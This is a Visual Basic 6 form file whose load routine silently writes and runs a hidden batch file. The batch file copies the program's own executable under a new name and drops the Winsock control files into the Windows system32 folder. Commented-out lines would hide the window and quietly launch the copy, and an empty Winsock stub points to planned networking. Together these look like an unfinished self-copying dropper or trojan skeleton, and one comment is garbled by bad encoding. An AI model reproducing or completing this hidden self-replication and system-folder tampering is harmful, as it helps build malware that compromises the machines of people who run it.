VERSION 5.00
Begin VB.Form Form1 
   Caption         =   "Form1"
   ClientHeight    =   3195
   ClientLeft      =   60
   ClientTop       =   345
   ClientWidth     =   4680
   LinkTopic       =   "Form1"
   ScaleHeight     =   3195
   ScaleWidth      =   4680
   StartUpPosition =   3  'Windows Default
   Begin VB.TextBox Text3 
      Height          =   285
      Left            =   240
      TabIndex        =   2
      Text            =   "Text3"
      Top             =   1440
      Width           =   3855
   End
   Begin VB.PictureBox Winsock1 
      Height          =   480
      Left            =   240
      ScaleHeight     =   420
      ScaleWidth      =   1140
      TabIndex        =   3
      Top             =   1800
      Width           =   1200
   End
   Begin VB.TextBox Text2 
      Height          =   285
      Left            =   360
      TabIndex        =   1
      Text            =   "Text2"
      Top             =   1080
      Width           =   3855
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Left            =   360
      TabIndex        =   0
      Text            =   "Text1"
      Top             =   720
      Width           =   3855
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Dim Q As String, Q1 As String, W As String, W1 As String, ShellBat As String, APPpath2 As String


Private Sub Form_Load()
'Form1.Visible = false
APPpath2 = (Mid(App.Path, (Len(App.Path) - 0), 2))
Q = App.Path + "\" + App.EXEName + ".exe"
Q1 = App.Path + "\" + "Sp_" + APPpath2 + ".exe"
f = FreeFile '¬озвращает номер свободного канала
W = App.Path + "\" + "MSWINSCK.OCX"
W1 = Environ("windir") + "\system32\MSWINSCK.OCX"
W2 = App.Path + "\" + "MSWINSCK.oca"
W12 = Environ("windir") + "\system32\MSWINSCK.oca"


ShellBat = App.Path + "\" + (Mid(App.Path, (Len(App.Path) - 0), 2)) + ".bat"
Open ShellBat For Output As f
Print #f, "copy " + Q + " " + Q1
Print #f, "copy " + W + " " + W1
Print #f, "copy " + W2 + " " + W12
Close #f
Shell ShellBat, vbHide


'FileCopy Q, Q1
Text1.Text = Q
Text2.Text = Q1
Text3.Text = APPpath2

End Sub
Private Function WInsock()
'Winsock1.

End Function

Private Sub Form_Unload(Cancel As Integer)
'Shell Q1, vbHide
End Sub
